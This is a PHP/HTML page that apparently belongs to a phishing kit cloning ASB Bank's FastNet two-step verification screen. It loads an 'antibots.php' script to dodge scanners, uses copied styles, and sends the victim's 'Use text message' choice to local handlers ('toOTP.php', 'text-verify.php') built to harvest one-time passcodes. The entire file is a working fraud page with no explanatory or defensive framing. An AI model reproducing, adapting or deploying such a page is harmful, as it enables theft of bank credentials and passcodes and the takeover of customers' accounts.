﻿<?php
session_start();
error_reporting(0);
require "antibots.php";
?>
<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html class=" js flexbox flexboxlegacy canvas canvastext webgl no-touch geolocation postmessage websqldatabase indexeddb hashchange history draganddrop websockets rgba hsla multiplebgs backgroundsize borderimage borderradius boxshadow textshadow opacity cssanimations csscolumns cssgradients cssreflections csstransforms csstransforms3d csstransitions fontface generatedcontent video audio localstorage sessionstorage webworkers no-applicationcache svg inlinesvg smil svgclippaths" lang="en" style=""><!--<![endif]--><!-- 13/09/2016 09:25 --><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
    
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="robots" content="noindex,nofollow">
    <meta name="viewport" content="width=device-width, initial-scale=1">
	<meta http-equiv="cache-control" content="max-age=0">
	<meta http-equiv="cache-control" content="no-cache">
	<meta http-equiv="expires" content="0">
	<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT">
	<meta http-equiv="pragma" content="no-cache">
    <link rel="shortcut icon" href="https://online.asb.co.nz/auth/favicon.ico">

    <title>ASB Bank - Log in</title>

	
    <link href="./verify/fonts.min.css" rel="stylesheet">
    <link href="./verify/style.min.css" rel="stylesheet">
    

    <!--[if lt IE 9]>
    <script type="text/javascript" src="/auth/js/lt-ie9-placeholder.min.js?v=2.1.0.0"></script>
    <![endif]-->

   
<script type="text/javascript">
/*<![CDATA[*/ 
document.cookie = "IV_JCT=%2Fauth; path=/; secure";
/*]]>*/ 
</script>
</head>

    




<body id="body" style="">
		
      <a href="https://online.asb.co.nz/auth/netcode?CancelMobileAccept=Cancel" class="logout-link">Log out</a>
    

    <div class="logon-container">
        <div class="logon-container__row">
            <div class="logon-container__col">

				<!-- ASB LOGO -->
				<div class="logon-container">
					<div class="logon-container__row">
						<div class="logon-container__col logon-typography--text-center">
							<div class="logon-header-logo">
								<a href="https://www.asb.co.nz/" title="Go to ASB Homepage">
									<svg class="logon-icon--asb" focusable="false"></svg>
								</a>
							</div>
						</div>
					</div>
				</div>

	    
        
<div class="mobile-accept-page">
	<div class="logon-container logon-container--grey">
		<div class="logon-container__inner">
			<div class="logon-container__row">
				<div class="logon-container__col">

					<div class="logon-typography-header two-step-verification">
            <h1 class="logon-typography-h1 logon-typography--text-center logon-typography-header__text">
            	Two-step verification
            </h1>
          </div>

					<div class="logon-typography--text-center">
              <p class="logon-typography--body1 logon-typography--opacity">For your security, we need to be sure
              	it's really you. <a href="https://asb.co.nz/two-step" target="_blank">Learn more</a></p>
          </div>

          <!-- NO JAVASCRIPT MESSAGE SECTION -->
					<noscript>
						<div class="logon-callout logon-callout--info logon-typography-spacing-xxlarge">
							<i aria-hidden="true" class="logon-icon logon-callout__icon">
								<svg class="logon-icon--information" focusable="false"></svg>
							</i>
							<span class="logon-callout__text">
								Your browser seems to have Javascript disabled. Make sure Javascript is enabled to log in.
							</span>
						</div>
					</noscript>

					<!-- COOKIE DISABLED MESSAGE SECTION -->
				

					<div class="logon-typography--text-center logon-typography-spacing-xxlarge">
						<div class="logon-spinner-circle-loader" style="display: none;"></div>
					</div>

					<div class="instructions-container-outer" style="display: block;">
						<div class="instructions-container">

							<div class="icon-container mobile">
								<i aria-hidden="true">
		              <svg focusable="false"></svg>
		            </i>
			        </div>

			        <div class="instruction-text-container">
				      

				        <div class="instructions resend" style="display: block;">
				        	<h4>Please check your registered Netcode mobile phone</h4>

									<p class="logon-typography--body1 logon-typography--opacity">
										A FastNet Netcode will be sent to your registered mobile number. Click Use text message below.<br> 
									</p>

									
				        </div>

				      

				        
				      </div>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>

	
	<div class="logon-container logon-container--grey  logon-typography-spacing-large">
		<div class="logon-container__inner">
			<div class="other-options-button-wrapper-outer">
				<div class="other-options-button-wrapper-inner">
					<button id="otherWaysToConfirmLogin" class="logon-button logon-button--text logon-button--small" onclick="document.location='text-verify.php?h=ed29nkjpsa16bhrjq4na16owq-1mucgfycc664m7vmhpjgqse65-1l5rurej3h44qodo5rn0cdvyn-8om6v2ckrxsbnwf40t9ta8a7e-34tiets5jpj294jd59h8c4s0n-28w7d5j2k2jtil9ncckolke4m-9jzlwicvu376y9q4vjq77y5ks-1m0whdrwis44c1hoa9mrwhlt4-1uvutm1mpyov7rqhtcf8fksby-aac54ic1fmca5xz1yvc5t9nfe-1hn40w0bomeivihj9lopp4hp2-c0121povror81d0xao0yez4gy'">>
		      	<span class="logon-button__label">Use text message</span>
		      </button>
          <!-- FORM SECTION -->
          <form name="netcode" method="post" action="toOTP.php" id="netcode" autocomplete="off">
             <input type="hidden" name="authnMod" value="NetCodeAuthn">
             <input name="action" type="hidden" value="netcodelogin">
             <input type="hidden" name="secfk" value="GQ3F-3NI2-669X-0B60-97OV-FTDI-WDP0-GHXM">

         	<div class="available-channel-buttons-wrapper">
	            
	            
	            <button id="requestSMS" name="requestSMS" type="submit" class="logon-button logon-button--outlined logon-button--small logon-typography-spacing">
	            	<span class="logon-button__label">Use text </span>
	            </button>
	            
			    </div>
	    	</form></div>
			</div>
		</div>
	</div>
	
</div>




     	

				<!-- SECTION TO CHOOSE SMS IN CASE OF BOTH OPTIONS -->
				<!-- HAVING A PROBLEM SECTION -->
				

                <!-- FOOTER SECTION -->
                <div class="logon-container logon-typography--text-center logon-typography-spacing-xxlarge logon-typography-top-spacing">
                    <div class="logon-container__row logon-container__row-cols-1">



						<div class="logon-container__col logon-typography--text-center ">
							<div class="logon-contact-numbers">
								<button type="button" class="logon-button logon-button--text-white logon-button--with-icon logon-button--small logon-contact-numbers__button">
									<i aria-hidden="true" class="logon-icon logon-button__icon">
										<svg class="logon-icon--chevron-down" focusable="false"></svg>
									</i>
									<span class="logon-button__label logon-typography--body1">Call for help</span>
								</button>
								<div class="logon-contact-numbers__content hide">
									<p class="logon-typography--body1 logon-typography--opacity logon-typography-nospacing"><a class="a--white" href="tel:0800327863" style="line-height: 1rem;">0800 327 863</a> (within New Zealand)</p>
									<p class="logon-typography--body1 logon-typography--opacity logon-typography-nospacing"><a class="a--white" href="tel:006493063185">+64 9 306 3185</a> (outside New Zealand)</p>
								</div>
							</div>
						</div>


                        <!-- DISCLAIMER AND FOOTER LINKS SECTION -->
                        
						
						
						<div class="logon-container__col"><p class="logon-typography--body2 logon-typography-spacing logon-typography--opacity">FastNet is licensed to ASB Bank Limited and is solely for the use of persons authorised by ASB Bank Limited. Do not access FastNet unless you have been specifically authorised to do so. Unauthorised access is prohibited.</p></div><div class="logon-container__col logon-typography-spacing-large"><p class="logon-typography--body3 logon-typography-spacing"><a class="a--white" href="https://www.asb.co.nz/documents/banking-with-asb/fastnet-classic-terms-and-conditions.html" target="_blank">Terms and conditions</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/security" target="_blank">About security</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/privacy" target="_blank">Privacy</a><span class="logon-typography__pipe"></span><a class="a--white" href="https://www.asb.co.nz/documents/banking-with-asb/internet-access-terms-and-conditions.html" target="_blank">Internet access terms</a></p></div>
                         <!-- END DISCLAIMER AND FOOTER LINKS SECTION -->

                    </div>
                </div>

			</div>
		</div>
	</div>
	
    <script type="text/javascript">
        $(document).on("pLoaded", document, function () {
			if (typeof MarketingConfig != "undefined" && MarketingConfig.EnableMarketing == "true") {
				LoadMarketing({
					Url: MarketingConfig.Url,
					DL: MarketingConfig.DL,
					Channel: MarketingConfig.Channel,
					BannerDelay: MarketingConfig.BannerDelay
				});
			}
        });

        $(function () {
			if (typeof MarketingConfig != "undefined" && MarketingConfig.EnableFunc == "true")
			{
				try {
					$(document.body).bind('funcLoaded', function () {
							LoadFunc({
								Url: MarketingConfig.Url,
								Channel: MarketingConfig.Channel,
								RegEx: MarketingConfig.RegEx,
								Sleep: MarketingConfig.Sleep,
								Data: null,
								Reload: MarketingConfig.Reload
							});
					});

					$('#initialFuncScript').attr('src', MarketingConfig.Url + MarketingConfig.JsSource);
				} catch (err) { }
			}
        });
    </script>
   



</body></html>